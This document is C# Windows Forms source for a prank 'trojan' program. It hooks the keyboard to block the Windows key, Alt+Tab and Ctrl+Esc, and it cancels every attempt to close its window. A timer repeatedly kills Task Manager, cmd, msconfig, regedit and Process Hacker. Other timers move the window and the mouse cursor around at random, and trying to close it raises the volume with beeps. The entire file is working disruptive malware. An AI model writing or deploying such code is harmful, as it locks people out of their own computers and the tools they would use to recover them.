using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Media;
using System.IO;

namespace TrojanGame
{
    public partial class Form1 : Form
    {

        #region DISABLE KEY
        /**
         * This is for swap right button mouse with left and viceversa
         **/
        [DllImport("user32.dll")]
        public static extern Int32 SwapMouseButton(Int32 bSwap);

        /**
         * DISABLE WINKEY, ALT+TAB ETC...
         **/ 
        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        //System level functions to be used for hook and unhook keyboard input  
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern short GetAsyncKeyState(Keys key);

        //Declaring Global objects     
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));

                // Disabling Windows keys 
                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1; // if 0 is returned then All the above keys will be enabled
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }
        #endregion

        #region Volume
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
        private const int APPCOMMAND_VOLUME_DOWN = 0x90000;
        private const int WM_APPCOMMAND = 0x319;

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
            IntPtr wParam, IntPtr lParam);

        private void VolUp()
        {
            SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
                            (IntPtr)APPCOMMAND_VOLUME_UP);
        }
        #endregion


        public Form1()
        {
            InitializeComponent();
            // Disable special key
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Start();
            timer2.Start();
            timer4.Start();

        }

        /**   -Form cant be closed-   **/
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                timer3.Start();
            }
            catch (Exception ex) { }
            finally
            {
                bool clsd = false;
                if(!clsd)
                    e.Cancel = true;
            }
        }


        /**   -Kill process if are open-   **/
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (Process.GetProcessesByName("taskmgr").Length > 0)
                    Process.GetProcessesByName("taskmgr")[0].Kill();

                if (Process.GetProcessesByName("cmd").Length > 0)
                    Process.GetProcessesByName("cmd")[0].Kill();

                if (Process.GetProcessesByName("msconfig").Length > 0)
                    Process.GetProcessesByName("msconfig")[0].Kill();

                if (Process.GetProcessesByName("ProcessHacker").Length > 0)
                    Process.GetProcessesByName("ProcessHacker")[0].Kill();

                if (Process.GetProcessesByName("regedit").Length > 0)
                    Process.GetProcessesByName("regedit")[0].Kill();

            }catch (Exception ex) { }
        }


        /**   -Set Form Location Randombly-   **/
        private void timer2_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            this.Location= new Point(r.Next(0,1920), r.Next(0,1080));
        }


        /**   -Volume Glitching-   **/
        private void timer3_Tick(object sender, EventArgs e)
        {
            VolUp();
            Console.Beep();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            int X = r.Next(0, 1920);
            int Y = r.Next(0, 1080);
            Cursor.Position = new Point(X, Y);
        }
    }
}
